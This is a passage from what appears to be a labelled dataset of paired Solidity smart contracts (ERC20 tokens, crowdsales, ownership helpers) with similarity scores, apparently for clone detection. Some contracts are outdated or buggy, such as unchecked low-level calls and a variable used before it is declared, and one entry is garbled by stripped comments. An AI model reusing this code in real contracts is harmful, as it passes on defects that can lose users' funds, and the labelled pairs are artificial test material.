    uint256 public totalEthInWei;         
    address public fundsWallet;           

    
    
    function Vanadium() {
        balances[msg.sender] = 1000 * 100000;               
        totalSupply = 1000;                        
        name = ""Vanadium"";                                   
        decimals = 5;                                               
        symbol = ""VAN"";                                             
        unitsOneEthCanBuy = 10;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[fundsWallet] >= amount);

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",1,,,,,
"contract Crowdsale7 {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale7(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () public payable {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() public afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",0.997378764,"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable public {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() public afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",1,,,,,
"contract StoriToken {
    string  public name = ""STori Token"";
    string  public symbol = ""STOR"";
    string  public standard = ""STori Token v1.0"";
    uint256 public totalSupply;

    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function StoriToken (uint256 _initialSupply) public {
        balanceOf[msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        Transfer(msg.sender, _to, _value);

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;

        allowance[_from][msg.sender] -= _value;

        Transfer(_from, _to, _value);

        return true;
    }
}",0.975378842,"contract DappToken {

    string  public name = ""Utopia Credits"";

    string  public symbol = ""UTOC"";

    string  public standard = ""DApp Token v1.0"";

    uint256 public totalSupply;



    event Transfer(

        address indexed _from,

        address indexed _to,

        uint256 _value

    );



    event Approval(

        address indexed _owner,

        address indexed _spender,

        uint256 _value

    );



    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;



    function DappToken (uint256 _initialSupply) public {

        balanceOf[msg.sender] = _initialSupply;

        totalSupply = _initialSupply;

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);



        balanceOf[msg.sender] -= _value;

        balanceOf[_to] += _value;



        Transfer(msg.sender, _to, _value);



        return true;

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;



        Approval(msg.sender, _spender, _value);



        return true;

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(_value <= balanceOf[_from]);

        require(_value <= allowance[_from][msg.sender]);



        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;



        allowance[_from][msg.sender] -= _value;



        Transfer(_from, _to, _value);



        return true;

    }

}",1,,,,,
"contract Rapid is ERC20 {

    using SafeMath for uint256;
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;

    string public constant name = ""Rapid"";
    string public constant symbol = ""RPD"";
    uint public constant decimals = 8;

    uint256 public totalSupply = 10000000000e8;
    uint256 public totalDistributed = 5000000000e8;
    uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    uint256 public value;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Distr(address indexed to, uint256 amount);
    event DistrFinished();

    event Burn(address indexed burner, uint256 value);

    bool public distributionFinished = false;

    modifier canDistr() {
        require(!distributionFinished);
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }

    function Rapid () public {
        owner = msg.sender;
        value = 4000e8;
        distr(owner, totalDistributed);
    }

    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }

    function enableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }

    function disableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = true;
        }
    }

    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    function airdrop(address[] addresses) onlyOwner canDistr public {

        require(addresses.length <= 255);
        require(value <= totalRemaining);

        for (uint i = 0; i < addresses.length; i++) {
            require(value <= totalRemaining);
            distr(addresses[i], value);
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {

        require(addresses.length <= 255);
        require(amount <= totalRemaining);

        for (uint i = 0; i < addresses.length; i++) {
            require(amount <= totalRemaining);
            distr(addresses[i], amount);
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {

        require(addresses.length <= 255);
        require(addresses.length == amounts.length);

        for (uint8 i = 0; i < addresses.length; i++) {
            require(amounts[i] <= totalRemaining);
            distr(addresses[i], amounts[i]);

            if (totalDistributed >= totalSupply) {
                distributionFinished = true;
            }
        }
    }

    function () external payable {
            getTokens();
     }

    function getTokens() payable canDistr onlyWhitelist public {

        if (value > totalRemaining) {
            value = totalRemaining;
        }

        require(value <= totalRemaining);

        address investor = msg.sender;
        uint256 toGive = value;

        distr(investor, toGive);

        if (toGive > 0) {
            blacklist[investor] = true;
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }

        value = value.div(100000).mul(99999);
    }

    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }

    
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);

        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }

    function withdraw() onlyOwner public {
        uint256 etherBalance = this.balance;
        owner.transfer(etherBalance);
    }

    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        
        

        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }


}",0.978172481,"contract BigWinToken is ERC20 {

    

    using SafeMath for uint256;

    address owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

    mapping (address => bool) public blacklist;



    string public constant name = ""BigWinToken"";

    string public constant symbol = ""BWT"";

    uint public constant decimals = 8;

    

    uint256 public totalSupply = 20000000000e8;

    uint256 public totalDistributed = 0;

    uint256 public totalDistributedi = 15000000000e8;

    uint256 public unitsOneEthCanBuy = 20000000e8;

    

    uint256 public totalRemaining = totalSupply.sub(totalDistributed);

    uint256 public value;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    

    event Distr(address indexed to, uint256 amount);

    event DistrFinished();

    

    event Burn(address indexed burner, uint256 value);



    bool public distributionFinished = false;

    

    modifier canDistr() {

        require(!distributionFinished);

        _;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    modifier onlyWhitelist() {

        require(blacklist[msg.sender] == false);

        _;

    }

    

    function BigWinToken () public {

        owner = msg.sender;

       

        distr(owner, totalDistributedi);

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }

    

    function enableWhitelist(address[] addresses) onlyOwner public {

        for (uint i = 0; i < addresses.length; i++) {

            blacklist[addresses[i]] = false;

        }

    }



    function disableWhitelist(address[] addresses) onlyOwner public {

        for (uint i = 0; i < addresses.length; i++) {

            blacklist[addresses[i]] = true;

        }

    }



    function finishDistribution() onlyOwner canDistr public returns (bool) {

        distributionFinished = true;

        DistrFinished();

        return true;

    }

    

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {

        totalDistributed = totalDistributed.add(_amount);

        totalRemaining = totalRemaining.sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        Distr(_to, _amount);

        Transfer(address(0), _to, _amount);

        return true;

        

        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }

    

    function airdrop(address[] addresses) onlyOwner canDistr public {

        

        require(addresses.length <= 255);

        require(value <= totalRemaining);

        

        for (uint i = 0; i < addresses.length; i++) {

            require(value <= totalRemaining);

            distr(addresses[i], value);

        }

	

        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }

    

    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {

        

        require(addresses.length <= 255);

        require(amount <= totalRemaining);

        

        for (uint i = 0; i < addresses.length; i++) {

            require(amount <= totalRemaining);

            distr(addresses[i], amount);

        }

	

        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }

    

    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {



        require(addresses.length <= 255);

        require(addresses.length == amounts.length);

        

        for (uint8 i = 0; i < addresses.length; i++) {

            require(amounts[i] <= totalRemaining);

            distr(addresses[i], amounts[i]);

            

            if (totalDistributed >= totalSupply) {

                distributionFinished = true;

            }

        }

    }

    

    function () external payable {

            getTokens();

     }

    

    function getTokens() payable canDistr onlyWhitelist public {

        

         address investor = msg.sender;

         uint256 amount = msg.value;

         require(toGive <= totalRemaining); 

       

         

      uint256 toGive = amount.div(500);





	distr(investor, toGive);

        

       



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }



    function balanceOf(address _owner) constant public returns (uint256) {

	    return balances[_owner];

    }



    

    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

    

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        Transfer(msg.sender, _to, _amount);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        Transfer(_from, _to, _amount);

        return true;

    }

    

    function approve(address _spender, uint256 _value) public returns (bool success) {

        

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }

    

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){

        ForeignToken t = ForeignToken(tokenAddress);

        uint bal = t.balanceOf(who);

        return bal;

    }

    

    function withdraw() onlyOwner public {

        uint256 etherBalance = this.balance;

        owner.transfer(etherBalance);

    }

    

    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);

        

        



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        totalDistributed = totalDistributed.sub(_value);

        Burn(burner, _value);

    }

    

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {

        ForeignToken token = ForeignToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));

        return token.transfer(owner, amount);

    }





}",1,,,,,
"contract ERC20 {
    function balanceOf(address _owner) public view returns (uint balance);
    function transfer(address _to, uint _value) public returns (bool success);
}",0.926388425,"contract Token {
    function balanceOf(address _owner) public view returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
}",1,,,,,
"contract TokenERC20 {

string public name;
string public symbol;
uint8 public decimals = 0;
uint256 public totalSupply;


mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) public allowance;


event Transfer(address indexed from, address indexed to, uint256 value);


event Approval(address indexed _owner, address indexed _spender, uint256 
_value);


event Burn(address indexed from, uint256 value);


constructor(
    uint256 initialSupply,
    string tokenName,
    string tokenSymbol
) public payable {
    totalSupply = initialSupply * 10 ** uint256(decimals);  
supply with the decimal amount
    balanceOf[msg.sender] = totalSupply;                
       all initial tokens
    name = tokenName;                                   
     display purposes
    symbol = tokenSymbol;                               
        for display purposes
}


function _transfer(address _from, address _to, uint _value) internal{
    
    require(_to != 0x0);
    
    require(balanceOf[_from] >= _value);
    
    require(balanceOf[_to] + _value > balanceOf[_to]);
    
    uint previousBalances = balanceOf[_from] + balanceOf[_to];
    
    balanceOf[_from] -= _value;
    
    balanceOf[_to] += _value;
    emit Transfer(_from, _to, _value);
    
 They should never fail
    assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
}


function transfer(address _to, uint256 _value) public returns (bool success) 
{
    _transfer(msg.sender, _to, _value);
    return true;
}


  function transferFrom(address _from, address _to, uint256 _value) public 
 returns (bool success) {
    require(_value <= allowance[_from][msg.sender]);     
    allowance[_from][msg.sender] -= _value;
    _transfer(_from, _to, _value);
    return true;
}


function approve(address _spender, uint256 _value) public
    returns (bool success) {
    allowance[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
}


function approveAndCall(address _spender, uint256 _value, bytes _extraData)
    public
    returns (bool success) {
    tokenRecipient spender = tokenRecipient(_spender);
    if (approve(_spender, _value)) {
        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }
}


function burn(uint256 _value) public returns (bool success) {
    require(balanceOf[msg.sender] >= _value);   
enough
    balanceOf[msg.sender] -= _value;            
    totalSupply -= _value;                      
    emit Burn(msg.sender, _value);
    return true;
}


function burnFrom(address _from, uint256 _value) public returns (bool 
 success) {
    require(balanceOf[_from] >= _value);                
targeted balance is enough
    require(_value <= allowance[_from][msg.sender]);    
    balanceOf[_from] -= _value;                         
 targeted balance
    allowance[_from][msg.sender] -= _value;         
    totalSupply -= _value;                              
totalSupply
    emit Burn(_from, _value);
    return true;
}
}",0.908066504,"contract CrisCoin {
    
    string public constant name = ""CrisCoin"";
    string public constant symbol = ""CSX"";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public owner;
    uint256 public constant RATE = 1000;
    
    uint256 initialSupply = 100000;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);

    function CrisCoin() public 
    {
        owner = msg.sender;
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
    }
    
    function () public payable
    {
        createTokens();
    }
    
    function createTokens() public payable
    {
        require( msg.value > 0 );
        
        require( msg.value * RATE > msg.value );
        uint256 tokens = msg.value * RATE;
        
        require( balanceOf[msg.sender] + tokens > balanceOf[msg.sender] );
        balanceOf[msg.sender] += tokens;
        
        require( totalSupply + tokens > totalSupply );
        totalSupply += tokens;
        
        owner.transfer(msg.value);
    }

    function _transfer(address _from, address _to, uint _value) internal 
    {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public 
    {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) 
    {
        require(_value <= allowance[_from][msg.sender]);
        
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) 
    {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success)
    {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) 
        {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns (bool success)
    {
        require(balanceOf[msg.sender] >= _value);
        
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;
        Burn(msg.sender, _value);
        
        return true;
    }

    function burnFrom(address _from, uint256 _value) public returns (bool success) 
    {
        require(balanceOf[_from] >= _value);
        require(_value <= allowance[_from][msg.sender]);
        
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        totalSupply -= _value;
        Burn(_from, _value);
        
        return true;
    }
}",2,,,,,
"contract Ownable {
  address public owner;

  function Ownable() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address newOwner) onlyOwner {
    if (newOwner != address(0)) {
      owner = newOwner;
    }
  }
}",0.969132814,"contract Ownable {
    
  address public owner;
 
  
  function Ownable() {
    owner = msg.sender;
  }
 
  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
 
  
  function transferOwnership(address newOwner) onlyOwner {
    require(newOwner != address(0));      
    owner = newOwner;
  }
 
}",1,,,,,
"contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  
  modifier whenNotPaused() {
    require (!paused);
    _;
  }

  
  modifier whenPaused {
    require (paused) ;
    _;
  }

  
  function pause() onlyOwner whenNotPaused returns (bool) {
    paused = true;
    Pause();
    return true;
  }

  
  function unpause() onlyOwner whenPaused returns (bool) {
    paused = false;
    Unpause();
    return true;
  }
}",0.975171067,"contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  
  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  
  modifier whenPaused {
    require(paused);
    _;
  }

  
  function pause() onlyOwner whenNotPaused returns (bool) {
    paused = true;
    Pause();
    return true;
  }

  
  function unpause() onlyOwner whenPaused returns (bool) {
    paused = false;
    Unpause();
    return true;
  }
}",0,,,,,
"contract Crowdsale {
  using SafeMath for uint256;

  
  MintableToken public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, MintableToken _token) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
    token = _token;
  }

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    token.mint(beneficiary, tokens);
    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
  }

  
  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

  
  function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
    return weiAmount.mul(rate);
  }

  
  
  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }

  
  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }

}",0.98989892,"contract Crowdsale {

    using SafeMath for uint256;



    

    MintableToken public token;



    

    uint256 public startTime;

    uint256 public endTime;



    

    address public wallet;



    

    uint256 public rate;



    

    uint256 public weiRaised;



    

    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);





    constructor(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, MintableToken _token) public {

        require(_startTime >= now);

        require(_endTime >= _startTime);

        require(_rate > 0);

        require(_wallet != address(0));

        require(_token != address(0));



        startTime = _startTime;

        endTime = _endTime;

        rate = _rate;

        wallet = _wallet;

        token = _token;

    }



    

    function () external payable {

        buyTokens(msg.sender);

    }



    

    function buyTokens(address beneficiary) public payable {

        require(beneficiary != address(0));

        require(validPurchase());



        uint256 weiAmount = msg.value;



        

        uint256 tokens = getTokenAmount(weiAmount);



        

        weiRaised = weiRaised.add(weiAmount);



        token.mint(beneficiary, tokens);

        emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);



        forwardFunds();

    }



    

    function hasEnded() public view returns (bool) {

        return now > endTime;

    }



    

    function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {

        return weiAmount.mul(rate);

    }



    

    

    function forwardFunds() internal {

        wallet.transfer(msg.value);

    }



    

    function validPurchase() internal view returns (bool) {

        bool withinPeriod = now >= startTime && now <= endTime;

        bool nonZeroPurchase = msg.value != 0;

        return withinPeriod && nonZeroPurchase;

    }



}",0,,,,,
"contract HashnodeTestCoin is StandardToken { 




string public name;                   
uint8 public decimals;                
string public symbol;                 
string public version = 'H1.0'; 
uint256 public unitsOneEthCanBuy;     
uint256 public totalEthInWei;         
address public fundsWallet;           



function HashnodeTestCoin() {
    balances[msg.sender] = 10000;               
    totalSupply = 10000;                        
    name = ""Paws"";                                   
    decimals = 0;                                               
    symbol = ""PAW"";                                             
    unitsOneEthCanBuy = 0;                                      
    fundsWallet = msg.sender;                                    
}

function() payable{
    totalEthInWei = totalEthInWei + msg.value;
    uint256 amount = msg.value * unitsOneEthCanBuy;
    if (balances[fundsWallet] < amount) {
        return;
    }

    balances[fundsWallet] = balances[fundsWallet] - amount;
    balances[msg.sender] = balances[msg.sender] + amount;

    Transfer(fundsWallet, msg.sender, amount); 

    
    fundsWallet.transfer(msg.value);                               
}


function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);

    
    
    
    if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
    return true;
}
}",0.949486984,"contract Vanadium is StandardToken { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = &#39;H1.0&#39;; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           

    
    
    function Vanadium() {
        balances[msg.sender] = 1000 * 100000;               
        totalSupply = 1000;                        
        name = ""Vanadium"";                                   
        decimals = 5;                                               
        symbol = ""VAN"";                                             
        unitsOneEthCanBuy = 10;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[fundsWallet] >= amount);

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",1,,,,,
"contract Migrations {
  address public owner;
  uint public last_completed_migration;

  modifier restricted() {
    if (msg.sender == owner) _;
  }

  function Migrations() {
    owner = msg.sender;
  }

  function setCompleted(uint completed) restricted public {
    last_completed_migration = completed;
  }

  function upgrade(address new_address) restricted public {
    Migrations upgraded = Migrations(new_address);
    upgraded.setCompleted(last_completed_migration);
  }
}",0.962848835,"contract Migrations {
    address public owner;
    uint public last_completed_migration;

    modifier restricted() {
        if (msg.sender == owner) _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function setCompleted(uint completed) public restricted {
        last_completed_migration = completed;
    }

    function upgrade(address new_address) public restricted {
        Migrations upgraded = Migrations(new_address);
        upgraded.setCompleted(last_completed_migration);
    }
}",1,,,,,
"contract CanergyCoin {

        string public constant name = ""CanergyCoin"";
        string public constant symbol = ""CAN"";
        uint8 public constant decimals = 0;
        uint public _totalSupply = 10000000000;
